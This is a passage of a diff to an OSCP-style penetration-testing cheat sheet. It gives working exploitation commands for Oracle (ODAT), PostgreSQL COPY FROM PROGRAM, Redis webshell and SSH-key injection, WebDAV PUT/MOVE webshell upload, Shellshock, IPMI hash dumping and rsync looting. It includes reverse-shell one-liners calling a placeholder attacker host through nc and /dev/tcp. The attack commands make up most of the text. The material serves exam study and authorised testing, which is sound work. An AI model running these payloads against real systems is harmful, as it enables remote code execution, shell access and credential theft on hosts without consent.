 Writes a local file to the target's filesystem using `UTL_FILE` package privileges (requires either explicit grants or `--sysdba` to bypass restrictions).
-Source: [ODAT Wiki (via search aggregation of module usage)](https://github.com/quentinhardy/odat/wiki)
 
 **File upload via DBMS_XSLPROCESSOR**
 ```bash
 odat dbmsxslprocessor -s <target-ip> -d <SID> -U <user> -P <password> --putFile /tmp/ evil.sh /local/evil.sh
 ```
 Abuses `DBMS_XSLPROCESSOR.READ2CLOB`/write primitives to drop a file server-side even when `UTL_FILE` isn't directly usable.
-Source: [ODAT Wiki — dbmsxslprocessor](https://github.com/quentinhardy/odat/wiki/dbmsxslprocessor)
 
 **Remote command execution via EXTERNALTABLE**
 ```bash
 odat externaltable -s <target-ip> -d <SID> -U <user> -P <password> --exec /tmp/ shell.sh
 ```
 Creates an Oracle external table pointing at an executable already staged (or uploaded) server-side and triggers it — note it cannot pass arguments, the target file must already have the execute bit set, and must live on the DB server.
-Source: [ODAT Wiki — externaltable](https://github.com/quentinhardy/odat/wiki/externaltable)
 
 **Privileged (SYSDBA) connection flag**
 ```bash
 odat all -s <target-ip> -d <SID> -U sys -P <password> --sysdba
 ```
 `--sysdba` connects `AS SYSDBA`, bypassing many role-based restrictions once the `sys`/DBA account's password is known — usually the pivot point for full OS command execution.
-Source: [ODAT Wiki / Kali Tools — odat](https://www.kali.org/tools/odat/)
 
 ### Tools table
 | Tool | Purpose |
@@ -2174,7 +1946,6 @@ PGPASSWORD='<password>' psql -h <target-ip> -p 5432 -U <username> -d <database>
 psql -h <target-ip> -p 5432 -U <username> -W <database>
 ```
 `PGPASSWORD` avoids the interactive password prompt for scripting; `-W` forces the prompt explicitly.
-Source: [HackTricks — Pentesting PostgreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
 
 **Core enumeration**
 ```sql
@@ -2189,7 +1960,6 @@ SHOW is_superuser;
 SELECT current_setting('is_superuser');
 ```
 Confirms server version (for CVE matching), enumerates accounts, and — critically — checks whether the current session already has superuser rights needed for `COPY ... PROGRAM`.
-Source: [HackTricks — Pentesting PostgreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql)
 
 **RCE via COPY FROM PROGRAM (command execution + output capture)**
 ```sql
@@ -2199,7 +1969,6 @@ SELECT * FROM cmd_exec;
 DROP TABLE cmd_exec;
 ```
 Runs an arbitrary OS command and pipes its stdout into a table row so the result can be read back over the SQL session — the standard "read-the-output" pattern.
-Source: [PayloadsAllTheThings — PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
 
 **Reverse shell via COPY FROM PROGRAM**
 ```sql
@@ -2207,14 +1976,12 @@ CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> <attacker-port> >/tmp/f';
 ```
 Uses the classic named-pipe `nc` reverse-shell one-liner as the "program" COPY executes, giving an interactive shell on the DB host as the postgres OS user.
-Source: [PayloadsAllTheThings — PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md), [Exploit-DB 46813 — PostgreSQL 9.3 COPY FROM PROGRAM Metasploit module](https://www.exploit-db.com/exploits/46813)
 
 **Privilege check requirement (why it works)**
 ```sql
 SELECT rolname FROM pg_roles WHERE pg_has_role('<current_user>', oid, 'member') AND rolname='pg_execute_server_program';
 ```
 Since PG 9.3, `COPY ... PROGRAM` is restricted to superusers and members of the `pg_execute_server_program` role — verify this before attempting the technique to avoid a permission-denied error tipping off logs.
-Source: [Juniper Threat Labs — DB:POSTGRESQL:COPY-FROM-RCE](https://www.juniper.net/us/en/threatlabs/ips-signatures/detail.DB:POSTGRESQL:COPY-FROM-RCE.html)
 
 **Metasploit automation**
 ```
@@ -2226,7 +1993,6 @@ set PAYLOAD cmd/unix/reverse
 run
 ```
 Automates the same `COPY FROM PROGRAM` technique against valid, sufficiently-privileged credentials without hand-writing the SQL. **Exam caveat: Metasploit modules on the OSCP exam are restricted to the single machine you've locked in for Metasploit use and cannot be run against additional targets — the manual `COPY ... FROM PROGRAM` SQL above works everywhere and should be the default technique.**
-Source: [Exploit-DB 46813](https://www.exploit-db.com/exploits/46813)
 
 ### Tools table
 | Tool | Purpose |
@@ -2252,7 +2018,6 @@ redis-cli -h <target-ip> INFO
 redis-cli -h <target-ip> CONFIG GET *
 ```
 A `PONG` with no `AUTH` prompt, plus a full `INFO`/`CONFIG GET *` dump (version, working directory, persistence settings), confirms the instance is fully exposed and unauthenticated.
-Source: [HackTricks — 6379 Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis), [jsmon.sh — Redis Unauthenticated Access](https://blogs.jsmon.sh/what-is-redis-unauthenticated-access-ways-to-exploit-examples-and-impact/)
 
 **Webshell drop via CONFIG SET / SAVE**
 ```
@@ -2263,7 +2028,6 @@ redis-cli -h <target-ip>
 > save
 ```
 Repoints Redis's RDB persistence directory and filename to the web root and a `.php` name, stores the PHP webshell payload as a string value, then `SAVE` forces Redis to flush its in-memory dataset to disk — writing the value (plus RDB binary framing bytes the PHP interpreter ignores) as `shell.php`.
-Source: [PayloadsAllTheThings — SSRF Redis RCE technique](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md), [HackTricks — 6379 Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
 
 **SSH key injection into authorized_keys**
 ```bash
@@ -2276,7 +2040,6 @@ redis-cli -h <target-ip> save
 ssh -i id_rsa root@<target-ip>
 ```
 Generates an attacker keypair, pads the public key with newlines (so surrounding RDB binary garbage doesn't corrupt the entry, since `authorized_keys` parsing tolerates unparsable lines), imports it as a Redis string value via `-x` (reads stdin), then repeats the `dir`/`dbfilename`/`save` trick against `/root/.ssh/authorized_keys` — landing a passwordless root SSH login if Redis runs as root.
-Source: [LevitatingBusinessMan/redis-ssh (GitHub)](https://github.com/LevitatingBusinessMan/redis-ssh), [Victor Zhu — Redis Unauthorized Access Vulnerability Simulation](https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419)
 
 **SSRF-to-RCE variant (gopher protocol, for blind/internal Redis)**
 ```
@@ -2284,7 +2047,6 @@ gopher://<redis-ip>:6379/_*1%0d%0a%2432%0d%0a...   (gopherus-generated payload e
                                                      CONFIG SET / SET / SAVE as raw RESP commands)
 ```
 Where direct TCP access isn't available but an SSRF primitive supporting the `gopher://` scheme is, the same `CONFIG SET dir` / `SET key` / `SAVE` command sequence is encoded as a raw Redis protocol (RESP) payload and delivered through the SSRF — tools like `gopherus` or `redis-ssrf` automate the encoding.
-Source: [xmsec/redis-ssrf (GitHub)](https://github.com/xmsec/redis-ssrf), [PayloadsAllTheThings — SSRF Advanced Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Advanced-Exploitation.md)
 
 ### Tools table
 | Tool | Purpose |
@@ -2323,7 +2085,6 @@ nmap --script http-webdav-scan -p 80 <target>
 nmap --script http-webdav-scan -p 443 <target>
 ```
 The `http-webdav-scan` NSE script sends an `OPTIONS` request and reports which WebDAV methods the server advertises (PUT, MOVE, COPY, DELETE, MKCOL, PROPFIND, etc.), confirming WebDAV is enabled and which operations are permitted.
-Source: https://nmap.org/nsedoc/scripts/http-webdav-scan.html
 
 **2. Detection — davtest (upload capability testing)**
 ```bash
@@ -2331,14 +2092,12 @@ davtest -url http://<target>/webdav/
 davtest -url http://<target>/webdav/ -auth <user>:<password>
 ```
 `davtest` automatically tests which file types (`.txt`, `.html`, `.asp`, `.aspx`, `.php`, `.jsp`, `.pl`, `.cgi`, etc.) can be uploaded to the WebDAV directory and which of those uploaded files are then executable by the web server — a one-shot triage of both upload and execution permissions per extension.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
 
 **3. Enumeration — interactive WebDAV shell with cadaver**
 ```bash
 cadaver http://<target>/webdav/
 ```
 Opens an interactive FTP-like shell for browsing, uploading, downloading, and managing files on the WebDAV share. Supports `ls`, `put`, `get`, `move`, `copy`, `delete`, `mkcol` (create directory) commands. Useful for manual exploration once WebDAV access is confirmed.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
 
 **4. Exploitation — PUT + MOVE bypass (IIS extension filter evasion)**
 ```bash
@@ -2349,7 +2108,6 @@ curl -X PUT http://<target>/webdav/cmd.txt -d '<%@ Page Language="C#" %><% Syste
 curl -X MOVE -H 'Destination: http://<target>/webdav/cmd.aspx' http://<target>/webdav/cmd.txt
 ```
 Many IIS WebDAV configurations block direct upload of `.aspx`/`.asp` files but allow `.txt`. The MOVE method renames the uploaded file server-side without re-checking the extension filter — a well-documented IIS misconfiguration that persists in OSCP-style lab environments. After the MOVE, browsing to `http://<target>/webdav/cmd.aspx` triggers the payload. The same technique applies to `.php` on Apache/nginx WebDAV setups.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
 
 **5. Authenticated WebDAV upload with curl**
 ```bash
@@ -2367,7 +2125,6 @@ When WebDAV requires authentication (common on Windows/IIS with Basic or NTLM au
 | `cadaver` | Interactive WebDAV shell (browse, upload, download, move) |
 | `curl` | Manual PUT/MOVE/DELETE requests for precise exploitation |
 
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/put-method-webdav.html
 
 ---
 
@@ -2383,28 +2140,24 @@ Shellshock (CVE-2014-6271) exploits a flaw in Bash's handling of environment var
 gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -x sh,pl,cgi
 ```
 Brute forces the `/cgi-bin/` directory for common CGI script names with shell/Perl/CGI extensions. Finding a valid script (200 response) is the prerequisite — Shellshock requires a specific CGI endpoint to inject through.
-Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
 
 **2. Discovery — nmap Shellshock detection**
 ```bash
 nmap --script http-shellshock --script-args uri=/cgi-bin/status.sh -p 80 <target>
 ```
 The `http-shellshock` NSE script sends the Shellshock payload in the User-Agent header and checks for evidence of command execution in the response. `uri=` must point to a known/discovered CGI script path — the script does not brute force paths on its own.
-Source: https://nmap.org/nsedoc/scripts/http-shellshock.html
 
 **3. Detection — manual curl test**
 ```bash
 curl -H "User-Agent: () { :; }; echo; /usr/bin/id" http://<target>/cgi-bin/script.sh
 ```
 The payload `() { :; };` is a function definition that Bash parses from the environment variable; the trailing `echo; /usr/bin/id` is the injected command that executes after the function definition due to the parsing flaw. The leading `echo;` outputs a blank line that acts as the HTTP header/body separator, ensuring the command output appears in the response body. A successful response showing `uid=...` confirms the target is vulnerable.
-Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
 
 **4. Exploitation — reverse shell via User-Agent**
 ```bash
 curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" http://<target>/cgi-bin/script.sh
 ```
 Replaces the detection payload with a standard Bash reverse shell one-liner. Set up a listener (`nc -lvnp 4444`) before sending. The shell runs as the web server user (typically `www-data` or `apache`).
-Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
 
 **5. Alternative injectable headers**
 ```bash
@@ -2415,7 +2168,6 @@ curl -H "Referer: () { :; }; /usr/bin/id > /var/www/html/output.txt" http://<tar
 curl -H "Cookie: () { :; }; /usr/bin/id > /tmp/output.txt" http://<target>/cgi-bin/script.sh
 ```
 Any HTTP header that the web server maps into the CGI environment is a valid injection point — not just User-Agent. Referer, Cookie, Accept-Language, and custom headers all reach the CGI process as environment variables. If User-Agent-based injection is filtered/WAF-blocked, try other headers.
-Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
 
 ### Tools table
 | Tool | Purpose |
@@ -2425,7 +2177,6 @@ Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
 | `curl` | Manual header injection for detection and exploitation |
 | `nmap` (`http-enum` NSE) | Generic web content discovery that may find `/cgi-bin/` entries |
 
-Source: https://book.hacktricks.wiki/en/pentesting-web/cgi.html
 
 ---
 
@@ -2441,7 +2192,6 @@ IPMI (Intelligent Platform Management Interface) on UDP 623 provides out-of-band
 nmap -sU -p 623 --script ipmi-version <target>
 ```
 Confirms the IPMI service is listening on UDP 623 and reports the IPMI protocol version (1.5 or 2.0). IPMI 2.0 is the version vulnerable to the RAKP hash-disclosure technique below.
-Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 
 **2. IPMI 2.0 RAKP hash dumping**
 ```bash
@@ -2451,7 +2201,6 @@ set RHOSTS <target>
 run
 ```
 The `ipmi_dumphashes` module initiates RAKP authentication handshakes for a list of common usernames (or a custom wordlist) and captures the HMAC-SHA1/HMAC-MD5 hash the BMC returns in RAKP Message 2. These hashes can then be cracked offline. **Exam caveat: Metasploit modules on the OSCP exam are restricted to the single machine designated for Metasploit use — consider whether the IPMI host is that machine before running.**
-Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 
 **3. ipmitool — authenticated enumeration**
 ```bash
@@ -2461,7 +2210,6 @@ ipmitool -I lanplus -H <target> -U admin -P admin lan print 1
 ipmitool -I lanplus -H <target> -U admin -P admin chassis status
 ```
 Once valid credentials are obtained (via cracking or defaults), `ipmitool` enumerates BMC users, network configuration, and hardware status. `-I lanplus` uses the IPMI 2.0 (RMCP+) interface.
-Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 
 **4. Default credentials to try**
 | Vendor | Username | Password |
@@ -2473,14 +2221,12 @@ Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 | Generic | `Administrator` | `Administrator` |
 
 Always try these before attempting hash dumping — BMC default credentials are left unchanged far more often than they should be.
-Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 
 **5. Cracking IPMI RAKP hashes**
 ```bash
 hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
 ```
 Hashcat mode `7300` handles IPMI2 RAKP HMAC-SHA1 hashes. The hash format output by Metasploit's `ipmi_dumphashes` module is directly compatible with hashcat without reformatting.
-Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 
 ### Tools table
 | Tool | Purpose |
@@ -2490,7 +2236,6 @@ Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 | `ipmitool` | Authenticated BMC interaction (user enum, config, chassis control) |
 | `hashcat` (`-m 7300`) | Crack captured IPMI 2.0 RAKP hashes offline |
 
-Source: https://book.hacktricks.wiki/en/pentesting/623-udp-ipmi.html
 
 ---
 
@@ -2506,21 +2251,18 @@ Rsync (TCP 873) is a file synchronization service that can expose named "modules
 nmap -p 873 --script rsync-list-modules <target>
 ```
 The `rsync-list-modules` NSE script connects to the rsync daemon and lists all advertised module names — equivalent to the manual listing below but integrated into an nmap scan workflow.
-Source: https://nmap.org/nsedoc/scripts/rsync-list-modules.html
 
 **2. Module listing — rsync native client**
 ```bash
 rsync --list-only rsync://<target>/
 ```
 Connects to the rsync daemon on port 873 and lists all available modules (share names). Each module name maps to a server-side directory configured in `/etc/rsyncd.conf`. Modules may or may not require authentication — the listing itself is typically unauthenticated.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
 
 **3. Anonymous download — entire module contents**
 ```bash
 rsync -av rsync://<target>/module_name/ ./loot/
 ```
 Recursively downloads the entire contents of a module to a local directory. `-a` preserves permissions/timestamps/symlinks (archive mode); `-v` enables verbose output. If the module is not password-protected, this is effectively anonymous read access to the mapped directory.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
 
 **4. List files in a module without downloading**
 ```bash
@@ -2528,21 +2270,18 @@ rsync --list-only rsync://<target>/module_name/
 rsync --list-only -r rsync://<target>/module_name/
 ```
 The first form lists top-level contents; adding `-r` recurses into subdirectories. Useful for triaging what's available before downloading everything.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
 
 **5. Check for writable modules (upload test)**
 ```bash
 rsync ./test.txt rsync://<target>/module_name/test.txt
 ```
 Attempts to upload a small test file to the module. If it succeeds (no error), the module is writable — a direct path to dropping webshells (if the module maps to a web root), planting SSH keys (if it maps to a home directory), or modifying configuration files.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
 
 **6. Authenticated access**
 ```bash
 rsync -av rsync://username@<target>/module_name/ ./loot/
 ```
 When a module requires authentication, rsync prompts for the password. Credentials may be found in other loot, or common defaults can be tried.
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
 
 **7. Key files to look for after download**
 Once a module's contents are downloaded, prioritize:
@@ -2557,4 +2296,3 @@ Once a module's contents are downloaded, prioritize:
 | `nmap` (`rsync-list-modules` NSE) | Detect rsync and list available modules |
 | `rsync` (native client) | List modules, browse contents, download/upload files |
 
-Source: https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html
